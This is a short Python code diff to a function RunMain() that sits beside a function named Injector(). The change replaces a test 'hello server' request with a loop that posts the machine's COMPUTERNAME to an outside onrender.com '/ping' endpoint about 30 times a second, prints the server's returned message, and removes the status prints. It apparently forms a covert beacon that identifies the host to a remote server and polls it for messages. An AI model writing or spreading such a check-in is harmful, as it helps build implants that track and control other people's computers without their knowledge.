@@ -156,12 +156,11 @@ def Injector():
 
 def RunMain():
     import requests
-    URL = "https://anotherwebsite-x1gv.onrender.com"
-    print("Main running")
+    fps = 30
+    URL = "https://anotherwebsite-x1gv.onrender.com/ping"
     while True:
-        time.sleep(1)
-        # Data you want to send to the server
-        payload = {"message": "Hello Server! This is Ryz's PC."}
+        time.sleep(1/fps)
+        payload = {"pcname": os.environ.get("COMPUTERNAME")}
         try:
             # Send the POST request with the JSON data
             response = requests.post(URL, json=payload)
@@ -170,7 +169,6 @@ def RunMain():
             if response.status_code == 200:
                 # Parse the JSON response text from the server
                 server_reply = response.json()
-                print("Success! Response from server:")
                 print(server_reply.get("server_message"))
             else:
                 print(f"Server returned an error code: {response.status_code}")
